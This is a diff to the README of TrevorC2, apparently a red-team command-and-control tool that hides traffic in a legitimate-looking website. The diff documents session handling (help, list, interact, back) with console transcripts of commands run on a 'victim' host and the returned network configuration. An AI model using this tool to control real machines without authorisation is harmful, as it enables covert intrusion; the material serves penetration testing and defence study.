@@ -66,10 +66,15 @@ python trevor2_client.py
 
 ## Session Management
 
-TrevorC2 supports the ability to handle multiple shells coming from different hostnames. The way TrevorC2 works is it will identify new hostnames as sessions. You can interact with the sessions once you execute a command. If you have multiple sessions, you can type a command and interact with that session based on the session number stored globally. Example below:
+TrevorC2 supports the ability to handle multiple shells coming from different hostnames. The way TrevorC2 works is it will identify new hostnames as sessions. You can interact with the sessions once you execute a command. If you have multiple sessions, you can type a command and interact with that session based on the session number stored globally. 
+
+When first starting TrevorC2, you can type help or ? for additional information. Basic command usage is "list" which will list any active shells or none at all, or "interact <session_id>" to interact with the shell you want. 
+
+You can always type back/exit within a shell, it will still remain active and not actually kill the shell.
+
+Example below:
 
 ```
-
 root@stronghold:/home/relik/Desktop/git/trevorc2# python trevorc2_server.py 
 
 TrevorC2 - Legitimate Website Covert Channel
@@ -80,49 +85,66 @@ https://www.trustedsec.com
 [*] Starting Trevor C2 Server...
 [*] Next, enter the command you want the victim to execute.
 [*] Client uses random intervals, this may take a few.
-Enter the command to execute on victim: 
-*** Received connection from 172.16.37.133 and hostname DESKTOP-3VDNDSJ for TrevorC2.
+[*] Type help for usage. Example commands, list, interact.
 
+trevorc2>help
+*** TrevorC2 Help Menu ***
+
+
+Command Usage:
+
+list - will list all shells available
+interact <id> - allow you to select which shells to interact with
+
+trevorc2>list
+
+*** Available TrevorC2 Shells Below ***
+
+No available TrevorC2 shells.
+
+trevorc2>
 *** Received connection from 127.0.0.1 and hostname stronghold for TrevorC2.
 
-Enter the command to execute on victim: ipconfig
-*** Select which assets to interact with to execute the command ***
+trevorc2>list
 
-1. DESKTOP-3VDNDSJ:172.16.37.133 (TrevorC2 Established)
-2. stronghold:127.0.0.1 (TrevorC2 Established)
+*** Available TrevorC2 Shells Below ***
+
+Format: <session_id> <hostname>:<ipaddress>
+
+1. stronghold:127.0.0.1 (Trevor C2 Established)
 
 
-Enter the session number to interact with: 1
+trevorc2>interact 1
+[*] Dropping into trevorc2 shell...
+[*] Use exit or back to select other shells
+stronghold:trevorc2>ifconfig
 [*] Waiting for command to be executed, be patient, results will be displayed here...
 [*] Received response back from client...
 =-=-=-=-=-=-=-=-=-=-=
-(HOSTNAME: DESKTOP-3VDNDSJ
-CLIENT: 172.16.37.133)
+(HOSTNAME: stronghold
+CLIENT: 127.0.0.1)
+ens33     Link encap:Ethernet  HWaddr 00:0c:29:63:7c:67  
+          inet addr:172.16.37.132  Bcast:172.16.37.255  Mask:255.255.255.0
+          inet6 addr: fe80::4b6b:fb52:f109:a7af/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:1400907 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:2588882 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:835091244 (835.0 MB)  TX bytes:2623070556 (2.6 GB)
 
-Windows IP Configuration
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:453640 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:453640 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:211565776 (211.5 MB)  TX bytes:211565776 (211.5 MB)
 
 
-Ethernet adapter Ethernet0:
-
-   Connection-specific DNS Suffix  . : localdomain
-   Link-local IPv6 Address . . . . . : fe80::8984:c775:d798:3b88%4
-   IPv4 Address. . . . . . . . . . . : 172.16.37.133
-   Subnet Mask . . . . . . . . . . . : 255.255.255.0
-   Default Gateway . . . . . . . . . : 172.16.37.2
-
-Ethernet adapter Bluetooth Network Connection:
-
-   Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . : 
-
-Tunnel adapter Teredo Tunneling Pseudo-Interface:
-
-   Connection-specific DNS Suffix  . : 
-   IPv6 Address. . . . . . . . . . . : 2001:0:9d38:6ab8:8aa:24a3:53ef:da7a
-   Link-local IPv6 Address . . . . . : fe80::8aa:24a3:53ef:da7a%6
-   Default Gateway . . . . . . . . . : ::
-
-Enter the command to execute on victim:
+stronghold:trevorc2>back
+trevorc2>exit
+[*] Exiting TrevorC2... 
 ```
 ## TODO
 
